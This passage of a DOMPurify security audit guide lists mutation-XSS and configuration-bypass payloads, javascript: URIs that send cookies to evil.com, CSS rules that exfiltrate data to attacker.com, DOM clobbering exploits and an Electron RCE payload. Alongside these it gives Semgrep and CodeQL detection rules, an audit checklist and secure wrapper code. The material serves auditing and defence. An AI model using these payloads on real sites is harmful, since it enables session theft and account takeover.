DOMPurify parses with `DOMParser` (scripting disabled, detached document). The browser re-parses the serialized output with scripting enabled in the live document. Namespace transitions and parser repair behaviors differ between these two contexts.

### Verbatim mXSS Payloads

**CVE-2020-26870 -- Form nesting mXSS (< 2.0.17), CVSS 6.1:**
```
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

**CVE-2020-26870 alternate (MathML namespace):**
```
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->
```

**SecurityMB 2019 -- SVG namespace mXSS:**
```
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```

**vovohelo 2020 -- SVG->MathML->HTML chain:**
```
<svg><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**Double mtext bypass:**
```
<math><mtext><mtext><style><img src=x onerror=alert(1)></style></mtext></mtext></math>
```

**Swagger UI adapted bypass -- substituting textarea for style:**
```
<form><math><mtext></form><form><mglyph><textarea></math><img src onerror=alert(1)>
```
Both `<style>` (rawtext) and `<textarea>` (RCDATA) create the same namespace confusion. Used to compromise 60+ organizations including PayPal, Atlassian, Microsoft, GitLab.

**CVE-2024-47875 -- Nesting depth mXSS (< 2.5.0 / 3.0.0-3.1.2), CVSS 10.0:**
```javascript
// Generate 512+ nested divs to hit Chromium depth cap
let prefix = '<div>'.repeat(514);
let suffix = '</div>'.repeat(514);
let payload = prefix + '<style><img src=x onerror=alert(document.domain)></style>' + suffix;
// DOMPurify sees <style> at depth 514 as rawtext (inert content)
// Browser reparses: at depth 512 cap, parser pops back; <img> ejects into body
```

**CVE-2026-47423 -- selectedcontent re-clone bypass (< 3.4.5), CVSS 7.5 est.:**
```
<select><option><img src=x onerror="alert(1)"></option><selectedcontent></selectedcontent></select>
```
Chromium 148+ and WebKit 625+ re-clone `<option>` content into `<selectedcontent>` AFTER DOMPurify's sanitization walk. The cloned `<img>` retains its `onerror` attribute.

**noscript scripting flag differential (< 2.3.6):**
```
<noscript><p title="</noscript><img src onerror=alert(1)>">
```
DOMPurify parses with scripting ON: noscript content is rawtext, img is inside the title attribute value -- safe. When re-parsed in a scripting-disabled context the title closes at the first quote and img becomes live.

**Form nesting mXSS (< 2.4.0):**
```
<form><math><mtext></form><form><mglyph><svg><mtext><style><img src onerror=alert(1)>
```

**CVE-2025-26791 -- SAFE_FOR_TEMPLATES + CUSTOM_ELEMENT_HANDLING (< 3.2.4):**
```javascript
const dirty = `<math><foo-bar><mi><li><table><foo-bar><li></li></foo-bar>` +
  `<a><style><! \${</style>}<foo-baz id="><img src onerror='alert(1)'>">hmm</foo-baz>` +
  `</a></table></li></mi></foo-bar></math>`;
const config = {
  SAFE_FOR_TEMPLATES: true,
  CUSTOM_ELEMENT_HANDLING: { tagNameCheck: /^foo-/, attributeNameCheck: () => true }
};
DOMPurify.sanitize(dirty, config); // XSS on affected versions
```

### Namespace Transition Attack Surface

MathML text integration points (allow HTML parsing inside MathML):
- `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` -- switch to HTML namespace
- `<mglyph>` and `<malignmark>` -- force back to MathML from HTML integration point
- `<annotation-xml encoding="text/html">` -- HTML integration

SVG integration points:
- `<svg foreignObject>` -- full HTML integration
- `<svg desc>`, `<svg title>` -- HTML integration points

The elevator mutation technique: `<svg></p>` causes `</p>` to be treated as `</svg>` in WebKit/Chrome, mutating namespace context on re-parse.

### Browser Depth Limits

| Browser | Max nesting depth | mXSS exploitable |
|---------|-------------------|------------------|
| Chrome/Chromium | 512 | Yes (CVE-2024-47875) |
| Edge (Chromium) | 512 | Yes |
| Firefox | ~2000+ | No |
| Safari/WebKit | ~512 | Version-dependent |

### RETURN_DOM_FRAGMENT as mXSS Mitigation

```javascript
// Eliminates the serialize/reparse cycle entirely:
const fragment = DOMPurify.sanitize(dirty, { RETURN_DOM_FRAGMENT: true });
element.textContent = '';
element.appendChild(fragment); // Moves nodes directly, no re-parse
```

---

## Failure Model B: Configuration Exploits

### Dangerous Options

**ALLOW_UNKNOWN_PROTOCOLS: true** -- Permits javascript: URIs:
```
<a href="javascript:alert(document.cookie)">click</a>
<a href="javascript:fetch('https://evil.com/?c='+document.cookie)">click</a>
<iframe src="javascript:alert(1)"></iframe>
<form action="javascript:alert(1)"><button>Submit</button></form>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
```

**WHOLE_DOCUMENT: true** -- Enables head-only elements:
```
<meta http-equiv="refresh" content="0;url=https://evil.com">
<base href="https://evil.com/">
```

**ALLOW_DATA_ATTR: true (default)** -- Enables framework gadgets:

rails-ujs one-click XSS (CVE-class, GitLab issues #213273 and #336138):
```
<a href="https://attacker.com/payload.js" data-remote="true" data-method="get" data-type="script" data-confirm="View attachment?">Important_Document.pdf</a>
```
When clicked, rails-ujs sends AJAX GET to URL and eval()s the response due to data-type="script".

TinyMCE data-mce-* bypass (CVE-2026-47759 through CVE-2026-47762):
```
<a href="https://safe.com" data-mce-href="javascript:alert(1)">link</a>
```
TinyMCE overwrites sanitized `href` with unsanitized `data-mce-href` during rendering.

TinyMCE mce:protected comment bypass (CVE-2026-47762):
```
<!-- mce:protected PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== -->
```
TinyMCE base64-decodes protected comments and inserts verbatim. Decodes to `<script>alert(1)</script>`.

**CUSTOM_ELEMENT_HANDLING prototype pollution (CVE-2026-41238):**
```javascript
Object.prototype.tagNameCheck = /.*/;
Object.prototype.attributeNameCheck = /.*/;
// Now ALL custom elements + ALL attributes pass through sanitization
```

**Permissive CUSTOM_ELEMENT_HANDLING:**
```javascript
DOMPurify.sanitize(dirty, {
  CUSTOM_ELEMENT_HANDLING: {
    tagNameCheck: /.*/, // matches everything
    attributeNameCheck: () => true // allows all attributes including event handlers
  }
});
// <evil-element onclick="alert(1)"> passes through
```

**FORBID_TAGS bypass via function-form ADD_TAGS (CVE-2026-41240):**
```javascript
DOMPurify.sanitize(dirty, {
  FORBID_TAGS: ['script'],
  ADD_TAGS: (tag) => true // function form bypasses FORBID_TAGS check entirely
});
```

**ADD_ATTR function form skipping URI validation (CVE-2026-65912):**
```javascript
DOMPurify.sanitize(dirty, {
  ADD_ATTR: (attr) => attr === 'href' // skips protocol validation; javascript: URIs pass
});
```

### Hook Exploitation

**afterSanitizeAttributes adding unsanitized attributes:**
```javascript
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  node.setAttribute('href', unsanitizedUrl); // added AFTER sanitization walk
});
```

**Hook allowlist permanent pollution (CVE-2026-65902):**
```javascript
DOMPurify.addHook('uponSanitizeElement', (node, data) => {
  data.allowedTags['script'] = true; // mutates internal allowlist permanently
  // All subsequent sanitize() calls allow <script>
});
```

**draw.io forceKeepAttr bypass (real-world case):**
```javascript
DOMPurify.addHook('uponSanitizeAttribute', function(node, data) {
  if (node.closest('svg') && data.attrName === 'xlink:href') {
    data.forceKeepAttr = true; // bypasses all value checking including javascript:
  }
});
// Secondary regex check bypassed with: &#10;javascript:alert(1)
// Leading newline entity bypasses the ^javascript: anchor in the regex
```

**Unicode ligature attack:**
```
<style>@keyframes x{}</ﬆyle>
```
U+FB06 (st ligature) normalizes to "st" in some parsers, closing the style block differently than expected.

**setConfig race condition:**
```javascript
DOMPurify.setConfig(permissiveConfig);
await asyncOperation(); // race window uses permissive config
DOMPurify.setConfig(strictConfig);
// Fix: use per-call config instead of setConfig
```

---

## Failure Model C: Post-Sanitization Transforms

All of these invalidate DOMPurify's safety guarantee -- the output is safe only as-is:

```javascript
// CRITICAL: Sanitize then concatenate
const clean = DOMPurify.sanitize(titleInput);
el.innerHTML = '<h1>' + clean + '</h1>' + unsanitizedBody;

// CRITICAL: Sanitize then HTML entity decode
const clean = DOMPurify.sanitize(dirty);
el.innerHTML = clean.replace(/&amp;/g, '&').replace(/&lt;/g, '<');
// Reverses DOMPurify's encoding of dangerous characters

// CRITICAL: Sanitize then URL decode
const clean = DOMPurify.sanitize(dirty);
el.innerHTML = decodeURIComponent(clean); // reintroduces < > characters

// HIGH: Sanitize then markdown conversion
const clean = DOMPurify.sanitize(dirty);
el.innerHTML = markdownToHtml(clean);

// HIGH: Sanitize then template substitution
const clean = DOMPurify.sanitize(a);
el.innerHTML = `<div class="${clean}">${unsanitized}</div>`;

// HIGH: Sanitize then setAttribute in wrong context
const clean = DOMPurify.sanitize(dirty); // sanitized as HTML
element.setAttribute('href', clean);     // "javascript:alert(1)" is safe text but executes as href
```

---

## Failure Model D: Wrapper Anti-Patterns

```javascript
// AP1: Error fallback returning raw input (CRITICAL)
try {
  return DOMPurify.sanitize(input, config);
} catch(e) {
  return input; // VULNERABLE: prototype pollution or malformed input can trigger this
}
// Fix: return '' on error

// AP2: Type-check bypass (HIGH)
if (typeof input !== 'string') return input;
// Objects with malicious toString() bypass; TrustedHTML objects bypass
// Fix: const str = String(input ?? '');

// AP3: Config spread operator override (HIGH)
DOMPurify.sanitize(input, { ...baseConfig, ...userConfig });
// If userConfig is attacker-influenced: { ALLOW_UNKNOWN_PROTOCOLS: true }
// Fix: Object.freeze(baseConfig); never accept user config overrides

// AP4: Conditional bypass (CRITICAL)
if (isTrusted || isAdmin) return rawInput;
// Fix: always sanitize; vary config strictness not whether to sanitize

// AP5: Cached sanitized output (MEDIUM)
cache.set(key, DOMPurify.sanitize(input));
// After upgrade, stale cache serves output from vulnerable old version

// AP8: setConfig race (HIGH)
DOMPurify.setConfig(permissiveConfig);
await asyncOperation(); // race window
DOMPurify.setConfig(strictConfig);
```

---

## Failure Model E: Framework-Specific Sinks

### React

```jsx
// VULNERABLE: dangerouslySetInnerHTML without sanitize
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// VULNERABLE: props spread injection
// If apiResponse = {"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}
<Component {...JSON.parse(apiResponse)} />

// SAFE: frozen config + useMemo
const SANITIZE_CONFIG = Object.freeze({ USE_PROFILES: { html: true }, ALLOW_DATA_ATTR: false });
export const useSanitizedHtml = (dirty) =>
  useMemo(() => ({ __html: DOMPurify.sanitize(String(dirty ?? ''), SANITIZE_CONFIG) }), [dirty]);
// Usage: <div dangerouslySetInnerHTML={useSanitizedHtml(html)} />

// SAFE with RETURN_DOM_FRAGMENT (via ref):
function SafeHtml({ html }) {
  const ref = useRef(null);
  useEffect(() => {
    if (ref.current) {
      const fragment = DOMPurify.sanitize(html, { RETURN_DOM_FRAGMENT: true });
      ref.current.textContent = '';
      ref.current.appendChild(fragment);
    }
  }, [html]);
  return <div ref={ref} />;
}
```

### Vue

```html
<!-- VULNERABLE -->
<div v-html="userContent"></div>

<!-- SAFE: use custom directive -->
<!-- app.directive('sanitized-html', vSanitizedHtml) -->
<div v-sanitized-html="userContent"></div>

<!-- Vue 2 SAFE_FOR_TEMPLATES interaction:
     If SAFE_FOR_TEMPLATES enabled and output fed to Vue compiler,
     {{ }} expressions may execute.
     Payload: {{constructor.constructor('alert(1)')()}} -->
```

### Angular

```typescript
// VULNERABLE: disables Angular's built-in sanitizer
trustedHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);

// VULNERABLE: bypasses Angular sanitizer
this.el.nativeElement.innerHTML = userInput;

// SAFE: DOMPurify pipe
@Pipe({ name: 'sanitize', pure: true })
export class SanitizePipe implements PipeTransform {
  transform(value: string): SafeHtml {
    const clean = DOMPurify.sanitize(String(value ?? ''), SANITIZE_CONFIG);
    return this.domSanitizer.bypassSecurityTrustHtml(clean);
  }
}
// Usage: <div [innerHTML]="userContent | sanitize"></div>
```

### Svelte

```html
<!-- VULNERABLE -->
{@html userContent}

<!-- VULNERABLE: server-side only -->
<script>const sanitized = browser ? DOMPurify.sanitize(html) : html;</script>
<!-- Server path returns unsanitized html -- client will re-render it -->
```

### jQuery

```javascript
// CVE-2020-11022: jQuery.html() evaluates <script> tags
$('#output').html(userInput); // VULNERABLE

// SAFE:
$('#output').html(DOMPurify.sanitize(userInput));
```

---

## DOM Clobbering

### Mechanism

Elements with `id` or `name` attributes become properties on `window` and `document`. DOMPurify allows `id` and `name` by default -- clobbering survives sanitization.

**2-level access via HTMLFormElement:**
```
<form id="config"><input name="environment" value="attacker_value" /></form>
// window.config.environment.value === "attacker_value"
```

**3-level access via HTMLCollection:**
```
<form id="config"></form>
<form id="config" name="prod"><input name="apiUrl" value="https://evil.com" /></form>
// window.config.prod.apiUrl.value === "https://evil.com"
```

**Gmail AMP4Email exploit (2019) -- clobbering AMP runtime variables:**
```
<a id="AMP_MODE" name="localDev"></a>
<a id="AMP_MODE" name="test"></a>
<a id="testLocation"></a>
<a id="testLocation" name="protocol" href="https://pastebin.com/raw/0tn8z0rG#"></a>
```
Clobbered `AMP_MODE.localDev` and `AMP_MODE.test` to truthy (triggering dev mode), then clobbered `testLocation.protocol` to redirect script loading to attacker URL. Full RCE via arbitrary JS loading in Gmail context.

**Prototype chain + clobbering combination:**
```javascript
// Step 1: Prototype pollution (separate vulnerability)
Object.prototype.toString = function() { return 'session=attacker_token'; };
// Step 2: Sanitized HTML clobbers document.cookie
// <img name="cookie" id="cookie">  -- passes DOMPurify
// Step 3: Application uses template literal
`${document.cookie}` // calls HTMLImageElement.toString()
// Walks prototype chain, finds polluted Object.prototype.toString
// Returns "session=attacker_token"
```

**DOMPurify gaps:**
- `_isClobbered()` checks HTMLFormElement children only
- Does NOT protect `<a>`, `<img>`, `<embed>`, `<object>` with id/name
- Does NOT protect application code reading window[] after sanitization
- `SANITIZE_NAMED_PROPS: true` (non-default) prefixes id/name with "user-content-"

---

## CSS Exfiltration

DOMPurify explicitly does not sanitize CSS. It allows `<style>` elements and `style` attributes by default.

### Attribute Selector Exfiltration

```css
input[value^="s"] { background: url('https://attacker.com/leak?p=s'); }
input[value^="se"] { background: url('https://attacker.com/leak?p=se'); }
input[value^="sec"] { background: url('https://attacker.com/leak?p=sec'); }
input[value^="secr"] { background: url('https://attacker.com/leak?p=secr'); }
input[value^="secre"] { background: url('https://attacker.com/leak?p=secre'); }
input[value^="secret"] { background: url('https://attacker.com/leak?p=secret'); }
```

### React Keylogger CSS

React updates the value attribute in real-time (controlled components) unlike vanilla HTML:
```css
input[value$="a"] { background: url('https://attacker.com/log?key=a'); }
input[value$="b"] { background: url('https://attacker.com/log?key=b'); }
/* one rule per character */
input[value$="@"] { background: url('https://attacker.com/log?key=%40'); }
```

### @font-face Character Detection

```css
@font-face {
  font-family: 'detect-secret';
  src: url('https://attacker.com/probe?char=s');
  unicode-range: U+0073; /* 's' */
}
.target-text { font-family: 'detect-secret', sans-serif; }
/* Browser downloads font only if element contains character in unicode-range */
```

### Fontleak (2025) -- Ligature-Based Sequence Extraction

Uses GSUB glyph substitution tables to assign unique glyph widths to character sequences. CSS @container queries detect container width to identify which sequences appear. Demonstrated on chatgpt.com: ~1,000 chars/min including user name, email, and access token prefix.

```css
@font-face { font-family: 'leak'; src: url('attacker.com/font.woff2'); }
.target-text { font-family: 'leak'; container-type: inline-size; }
@container (min-width: 500px) {
  .probe::after { content: url('https://attacker.com/leak?match=secret'); }
}
```

### @import Recursive Exfiltration

```
1. Inject: @import url('https://attacker.com/steal?step=0');
2. Attacker server delays, receives initial character probes via attribute selectors
3. Returns CSS probing next character + new @import for next iteration
4. Chain deepens until full token extracted
```

### CSS Exfiltration Remediation

```javascript
DOMPurify.sanitize(dirty, {
  FORBID_TAGS: ['style'],
  FORBID_ATTR: ['style'],
});
// CSP defense:
// Content-Security-Policy: style-src 'self'; font-src 'self'; img-src 'self'
```

---

## Trusted Types Integration

```javascript
// RETURN_TRUSTED_TYPE creates a TrustedHTML object:
const clean = DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true });
element.innerHTML = clean; // No Trusted Types violation

// Required CSP:
// Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify
```

**CVE-2026-65899 -- Trusted Types policy survives clearConfig():**
In some versions the policy reference is retained after clearConfig(), causing stale policy behavior.

**TrustedHTML to string conversion loss:**
```javascript
const trustedHtml = DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true });
// All of these lose TrustedHTML type (direct innerHTML assignment then violates TT):
trustedHtml.toString()       // becomes string
`${trustedHtml}`             // becomes string
'' + trustedHtml             // becomes string
JSON.stringify(trustedHtml)  // serialized as string
```

**Recommended CSP:**
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM}';
  style-src 'self' 'unsafe-inline';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  require-trusted-types-for 'script';
  trusted-types dompurify;
  report-uri /csp-report;
```

---

## Server-Side Parser Differentials

| Behavior | jsdom | Real Browser |
|----------|-------|-------------|
| `<noscript>` content | HTML (scripting disabled) | Raw text (scripting enabled) |
| 512-element depth limit | No limit | Chrome/Safari: 512 cap |
| SVG namespace transitions | May differ from spec | Full spec compliance |
| MathML integration points | May differ | Full spec compliance |

**Joplin RCE (CVE-2023-33726) -- htmlparser2 ignores namespaces:**
```
<form><math><mtext></form><form><mglyph><svg><mtext><style>
</math><img src onerror="require('child_process').exec('calc')">
```
Node.js path (htmlparser2): `<style>` becomes rawtext, img is text content -- SAFE.
Browser path (Chromium): namespace-aware parsing, img ejects into body -- RCE in Electron.

**Shared DOM instance problem:**
```javascript
// VULNERABLE: shared instance with global state
const serverDOMPurify = createDOMPurify(globalWindow);
// SAFE: per-request instance
function serverSanitize(dirty) {
  const window = new JSDOM('').window;
  return createDOMPurify(window).sanitize(dirty, config);
}
// ALWAYS re-sanitize on client -- server sanitization alone is insufficient
```

---

## CVE Catalog

### Critical (CVSS >= 9.0)

| CVE | CVSS | Affected Versions | Root Cause |
|-----|------|-------------------|-----------|
| CVE-2024-47875 | 10.0 | < 2.5.0, 3.0.0-3.1.2 | 512-depth Chromium flattening mXSS |
| CVE-2024-48910 | 9.1 | < 2.5.4, 3.0.0-3.1.7 | Comment-based mXSS (--!> close) |
| CVE-2022-23631 | 9.8 | < 2.3.6 | Prototype pollution via `in` operator |

### High (CVSS 6.0-8.9)

| CVE | CVSS | Affected Versions | Root Cause |
|-----|------|-------------------|-----------|
| CVE-2024-45801 | 7.3 | < 2.5.0, 3.0.0-3.1.3 | Namespace mXSS + prototype pollution |
| CVE-2026-47423 | 7.5 est. | < 3.4.5 | selectedcontent re-clone (Chromium 148+) |
| CVE-2024-21501 | 6.1 | < 2.4.9, 3.0.0-3.0.8 | Prototype pollution via config |
| CVE-2024-21500 | 6.1 | < 2.4.8, 3.0.0-3.0.7 | Shadow DOM sanitization bypass |
| CVE-2023-49146 | 6.1 | < 2.4.7, 3.0.0-3.0.6 | Prototype pollution in config merging |
| CVE-2023-48929 | 6.1 | < 2.4.4 | CUSTOM_ELEMENT_HANDLING pollution |
| CVE-2020-26870 | 6.1 | < 2.0.17 | Form nesting mXSS (MathML namespace) |
| CVE-2019-20138 | 6.1 | < 2.0.1 | Math/SVG namespace mXSS |

### Version Risk Summary

| Version Range | Risk Level |
|--------------|------------|
| < 2.3.6 | CRITICAL (proto pollution CVSS 9.8 + all earlier) |
| 2.4.9 - 2.4.x | CRITICAL (nesting mXSS CVSS 10.0) |
| 3.0.8 - 3.1.2 | CRITICAL (nesting mXSS CVSS 10.0) |
| 3.1.4 - 3.1.6 | CRITICAL (comment mXSS CVSS 9.1) |
| 3.1.7 - 3.4.4 | HIGH (selectedcontent bypass) |
| >= 3.4.13 | MINIMAL (all known CVEs patched) |

**Minimum recommended version: 3.4.16**

---

## SAST Detection Rules

### Semgrep Rules

**Rule 1: Missing sanitization on innerHTML:**
```yaml
rules:
  - id: dompurify-missing-sanitization-innerhtml
    patterns:
      - pattern-either:
          - pattern: $EL.innerHTML = $VALUE;
          - pattern: $EL.outerHTML = $VALUE;
          - pattern: $EL.insertAdjacentHTML($POS, $VALUE);
      - pattern-not: $EL.innerHTML = DOMPurify.sanitize(...);
      - pattern-not: $EL.outerHTML = DOMPurify.sanitize(...);
      - pattern-not: $EL.insertAdjacentHTML($POS, DOMPurify.sanitize(...));
      - pattern-not: $EL.innerHTML = "";
    message: innerHTML/outerHTML/insertAdjacentHTML without DOMPurify.sanitize()
    languages: [javascript, typescript]
    severity: ERROR
```

**Rule 2: Post-sanitization modification:**
```yaml
  - id: dompurify-post-sanitization-modification
    patterns:
      - pattern: |
          $CLEAN = DOMPurify.sanitize(...);
          ...
          $RESULT = $CLEAN.replace(...);
      - pattern: |
          $CLEAN = DOMPurify.sanitize(...);
          ...
          $RESULT = decodeURIComponent($CLEAN);
      - pattern: |
          $CLEAN = DOMPurify.sanitize(...);
          ...
          $RESULT = $CLEAN + $OTHER;
    message: String modification after DOMPurify.sanitize() reintroduces XSS vectors
    severity: ERROR
```

**Rule 3: Dangerous config:**
```yaml
  - id: dompurify-allow-unknown-protocols
    pattern: DOMPurify.sanitize($INPUT, { ..., ALLOW_UNKNOWN_PROTOCOLS: true, ... })
    message: ALLOW_UNKNOWN_PROTOCOLS:true permits javascript: URIs
    severity: ERROR

  - id: dompurify-permissive-custom-element
    pattern: DOMPurify.sanitize($INPUT, { ..., CUSTOM_ELEMENT_HANDLING: { ..., tagNameCheck: /.*/, ... }, ... })
    message: tagNameCheck matching all allows any custom element
    severity: WARNING
```

**Rule 4: Error fallback raw input:**
```yaml
  - id: dompurify-error-fallback-raw-input
    patterns:
      - pattern: |
          try { $RESULT = DOMPurify.sanitize($INPUT, ...); }
          catch($ERR) { $RESULT = $INPUT; }
    message: Error fallback returns raw unsanitized input -- return empty string instead
    severity: ERROR
```

**Rule 5: React dangerouslySetInnerHTML:**
```yaml
  - id: dompurify-react-dangerous-html
    pattern: dangerouslySetInnerHTML={{ __html: $VALUE }}
    pattern-not-inside: DOMPurify.sanitize(...)
    message: React dangerouslySetInnerHTML without DOMPurify
    severity: ERROR
    metadata:
      technology: [react]
```

**Rule 6: Angular bypassSecurityTrustHtml:**
```yaml
  - id: dompurify-angular-bypass-trust
    pattern: $SANITIZER.bypassSecurityTrustHtml($VALUE)
    message: bypassSecurityTrustHtml disables Angular sanitizer; always use DOMPurify first
    severity: ERROR
```

### CodeQL Taint Analysis

```ql
class DOMPurifySanitizeBarrier extends DataFlow::Node {
  DOMPurifySanitizeBarrier() {
    exists(DataFlow::CallNode call |
      call.getCalleeName() = "sanitize" and
      call.getReceiver().getAVariable().getName() = "DOMPurify" and
      this = call.getAReturnedNode()
    )
  }
}
class MissingDOMPurifyConfig extends TaintTracking::Configuration {
  MissingDOMPurifyConfig() { this = "MissingDOMPurifyConfig" }
  override predicate isSource(DataFlow::Node source) { source instanceof RemoteFlowSource }
  override predicate isSink(DataFlow::Node sink) { sink instanceof InnerHtmlSink }
  override predicate isSanitizer(DataFlow::Node node) { node instanceof DOMPurifySanitizeBarrier }
}
from MissingDOMPurifyConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
where config.hasFlowPath(source, sink)
select sink.getNode(), source, sink, "User-controlled data flows to innerHTML without DOMPurify"
```

### CI/CD Integration

```yaml
name: DOMPurify Security Scan
on: [pull_request]
jobs:
  dompurify-sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Check DOMPurify version
        run: |
          VERSION=$(node -e "console.log(require('dompurify/package.json').version)")
          MINIMUM="3.4.13"
          if [ "$(printf '%s\n' "$MINIMUM" "$VERSION" | sort -V | head -n1)" != "$MINIMUM" ]; then
            echo "::error::DOMPurify $VERSION below minimum $MINIMUM"; exit 1
          fi
      - name: Run Semgrep DOMPurify rules
        uses: returntocorp/semgrep-action@v1
        with:
          config: .semgrep/dompurify-rules.yml
```

---

## Fingerprinting and Reconnaissance

### Version Detection

```javascript
// Method 1: Global property (non-bundled):
console.log(DOMPurify.version); // "3.2.4"

// Method 2: CDN script src version in URL
// Method 3: Probe lockfiles: GET /package-lock.json, /yarn.lock, /node_modules/dompurify/package.json

// Method 4: Behavioral fingerprinting:
// Payload: <math><mtext><table><mglyph><style><!--</style>
//   Empty string output: version >= 2.0.17
//   Partial output: version < 2.0.17
// Payload: <noscript><p title="</noscript><img src=x>">
//   img removed: version >= 2.3.6
//   img preserved: version < 2.3.6
```

### Configuration Probing Matrix

```
Probe 1: <svg><rect /></svg>              -> SVG support enabled?
Probe 2: <math><mi>x</mi></math>          -> MathML support enabled?
Probe 3: <div style="color:red">x</div>   -> style attr allowed?
Probe 4: <a href="javascript:void(0)">x</a> -> javascript: URI blocked?
Probe 5: <div data-custom="x">x</div>    -> data-* attrs allowed?
Probe 6: <custom-element>x</custom-element> -> custom elements pass?
Probe 7: <div id="x" name="y">x</div>    -> id/name attrs allowed?
Probe 8: <form action="x"><input></form>  -> form elements allowed?
Probe 9: <style>body{color:red}</style>   -> style elements allowed?
Probe 10: <a href="data:text/html,x">x</a> -> data: URI blocked?
```

---

## Real-World Case Studies

### Swagger UI -- 60+ Organizations (DOMPurify 2.2.2 bundle)

Swagger UI 3.37.2 bundled DOMPurify 2.2.2 with `FORBID_TAGS: ['style']`. Researcher adapted the DOMPurify 2.2.3 mXSS bypass by substituting `<textarea>` for `<style>`. Both rawtext and RCDATA elements created the same namespace confusion. Organizations affected: PayPal, Atlassian, Microsoft, GitLab, Yahoo, Jamf Pro (full admin account takeover via stolen localStorage authToken).

**Key lesson:** FORBID_TAGS is not a substitute for updating. Blocking `<style>` doesn't prevent bypass because alternative rawtext/RCDATA elements exist.

### Joplin RCE (CVE-2023-33726)

isomorphic-dompurify used htmlparser2 (ignores namespaces) in Node.js. Chromium (scripting+namespace-aware) reparsed to give full RCE in Electron context. Required: `require('child_process').exec('calc')` in onerror attribute.

### draw.io Hook Bypass

Custom DOMPurify hook used `forceKeepAttr = true` for `xlink:href` on SVG elements. Secondary regex check bypassed with `&#10;javascript:alert(1)` (leading newline entity bypasses `^javascript:` anchor).

### GitLab rails-ujs Exploitation

rails-ujs data-* attributes (data-remote, data-method, data-type, data-confirm) are interpreted as behavior instructions. `data-type="script"` causes eval() of AJAX response. DOMPurify allows data-* by default. Required fix: `FORBID_ATTR: ['data-remote', 'data-method', 'data-type', 'data-confirm']`.

### express-dompurify Supply Chain Attack

Malicious npm package `express-dompurify` impersonated legitimate Express middleware. `postinstall` script exfiltrated Chrome passwords/cookies, MetaMask wallet data, and macOS Keychain to attacker server at `95.216.251.178:8001/uploads`.

---

## Prioritized Audit Checklist

### Priority 1 -- Critical (Any One = Active XSS Risk)

- [ ] DOMPurify version >= 3.4.16 (`npm ls dompurify`)
- [ ] No `ALLOW_UNKNOWN_PROTOCOLS: true` in any config
- [ ] No error fallback returning raw input (`catch(e) { return input }`)
- [ ] No post-sanitization string modification (decode, replace, concat)
- [ ] Every innerHTML/outerHTML/insertAdjacentHTML uses DOMPurify
- [ ] Every dangerouslySetInnerHTML / v-html / bypassSecurityTrustHtml / {`@html`} uses DOMPurify
- [ ] No conditional sanitization bypass (trust flags, role checks, feature flags)
- [ ] `SAFE_FOR_XML` not set to `false`
- [ ] No server-side-only sanitization (always re-sanitize on client)

### Priority 2 -- High (Significantly Weakens Protection)

- [ ] `RETURN_DOM_FRAGMENT: true` used where framework supports it
- [ ] `USE_PROFILES: { html: true }` when SVG/MathML not needed
- [ ] No permissive `CUSTOM_ELEMENT_HANDLING` (`tagNameCheck: /.*/`)
- [ ] No caching of DOMPurify output (Map, WeakMap, localStorage)
- [ ] No type-check bypass (`typeof input !== 'string'`)
- [ ] All hooks audited (no forceKeepAttr bypass, no allowlist mutation)
- [ ] Server and client configurations consistent

### Priority 3 -- Medium (Defense in Depth)

- [ ] Trusted Types CSP deployed (`require-trusted-types-for 'script'`)
- [ ] `SANITIZE_NAMED_PROPS: true` where clobbering is a concern
- [ ] `FORBID_TAGS: ['style']` and `FORBID_ATTR: ['style']` (prevents CSS exfiltration)
- [ ] Semgrep rules deployed in CI/CD pipeline
- [ ] Wrapper functions follow secure pattern (frozen config, coerce to String, empty string on error)
- [ ] Rich-text editor integration audited (TinyMCE data-mce-*, CKEditor GHS wildcard patterns)

### Priority 4 -- Defense in Depth

- [ ] CSP `report-uri` configured and monitored for violations
- [ ] `object-src 'none'` in CSP
- [ ] `base-uri 'self'` in CSP
- [ ] Playwright browser-matrix tests (Chromium, Firefox, WebKit)
- [ ] Automated dependency updates (Dependabot/Renovate)
- [ ] Quarterly re-audit scheduled

---

## Secure Integration Patterns

### Minimal Secure Wrapper

```javascript
const SANITIZE_CONFIG = Object.freeze({
  USE_PROFILES: { html: true },
  FORBID_TAGS: ['style'],
  FORBID_ATTR: ['style'],
  ALLOW_DATA_ATTR: false,
  ALLOW_UNKNOWN_PROTOCOLS: false,
  SAFE_FOR_XML: true,
});

function sanitizeHTML(dirty) {
  const input = String(dirty ?? '');
  try {
    return DOMPurify.sanitize(input, SANITIZE_CONFIG);
  } catch (error) {
    console.error('[sanitizeHTML] DOMPurify error:', error);
    return ''; // NEVER return raw input on error
  }
}
```

### Maximum Security Config

```javascript
const MAX_SECURITY_CONFIG = Object.freeze({
  ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'u', 'strong', 'em', 'a', 'ul', 'ol', 'li',
                  'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'pre', 'code'],
  ALLOWED_ATTR: ['href', 'title', 'class'],
  FORBID_TAGS: ['style', 'svg', 'math', 'form', 'input', 'script', 'template'],
  FORBID_ATTR: ['style', 'onerror', 'onload', 'onclick', 'onfocus', 'onblur'],
  ALLOW_DATA_ATTR: false,
  ALLOW_UNKNOWN_PROTOCOLS: false,
  SAFE_FOR_XML: true,
  SANITIZE_NAMED_PROPS: true,
});
```

### Framework Safe Patterns

**React:**
```typescript
const SANITIZE_CONFIG = Object.freeze({ USE_PROFILES: { html: true }, ALLOW_DATA_ATTR: false });
export const useSanitizedHtml = (dirty: string): { __html: string } =>
